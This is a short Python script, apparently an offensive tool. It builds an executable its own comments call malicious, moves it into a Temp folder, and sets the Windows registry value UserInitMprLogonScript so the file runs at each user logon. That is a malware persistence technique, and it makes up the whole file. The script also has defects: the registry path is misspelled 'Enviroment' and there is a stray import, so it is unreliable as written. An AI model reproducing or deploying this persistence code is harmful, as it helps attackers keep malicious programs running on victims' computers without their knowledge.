from fileinput import filename
import os, shutil, winreg

filedir= os.path.join(os.getcwd(),"Temp");
filename="begin.exe"
filepath=os.path.join(filedir,filename)
#Use BuildExe to create malicious executable
if os.path.isfile(filepath):
    os.remove(filepath)
#Use BuildExe to create malicious executable
os.system("python BuildExe.py")
#Move malicious executable to desired directory
shutil.move(filename,filedir)
#Windows logon script keys
reghive=winreg.HKEY_CURRENT_USER
regpath="Enviroment"

#reghive=winreg.HKEY_USER
#regpath="Enviroment"

#add registy logon script
reg= winreg.ConnectRegistry(None,reghive)
key= winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
winreg.SetValueEx(key,"UserInitMprLogonScript",0,winreg.REG_SZ,filepath)